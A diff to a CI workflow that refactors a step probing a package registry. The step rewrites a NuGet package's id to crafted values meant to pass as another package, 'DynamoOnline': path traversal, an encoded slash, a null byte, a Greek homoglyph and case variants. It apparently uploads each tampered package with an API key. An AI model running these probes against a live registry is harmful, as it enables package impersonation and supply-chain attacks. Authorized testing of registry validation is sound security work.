@@ -37,23 +37,18 @@ jobs:
       - name: Test various package ID tricks
         run: |
           cd artifacts
+          ORIG_PKG=$(ls *.nupkg)
           
-          for PAYLOAD in \
-            "DynamoOnline/../DynamoTest456" \
-            "../DynamoOnline" \
-            "DynamoOnline%2FTest" \
-            "DynamoOnline%00Test" \
-            "DynamoΟnline" \
-            "DYNAMOONLINE"
-          do
+          test_payload() {
+            PAYLOAD="$1"
             echo "=== Testing: $PAYLOAD ==="
             
-            rm -rf tampered
+            rm -rf tampered tampered.nupkg
             mkdir tampered
-            unzip -o *.nupkg -d tampered
+            unzip -o "$ORIG_PKG" -d tampered
             
-            # Replace package ID
-            find tampered -name "*.nuspec" -exec sed -i "s/<id>DynamoTest456<\/id>/<id>$PAYLOAD<\/id>/g" {} \;
+            # Use | as sed delimiter to avoid / issues
+            find tampered -name "*.nuspec" -exec sed -i "s|<id>DynamoTest456</id>|<id>$PAYLOAD</id>|g" {} \;
             
             cat tampered/*.nuspec
             
@@ -71,6 +66,15 @@ jobs:
             
             echo "Response: $RESPONSE"
             echo ""
-          done
+          }
+          
+          test_payload "DynamoOnline/../DynamoTest456"
+          test_payload "../DynamoOnline"
+          test_payload "DynamoOnline%2FTest"
+          test_payload "DynamoOnline%00Test"
+          test_payload "DynamoΟnline"
+          test_payload "DYNAMOONLINE"
+          test_payload "dynamoonline"
+          test_payload "Dynamo.Online"
         env:
           NUGET_KEY: ${{ steps.login.outputs.NUGET_API_KEY }}
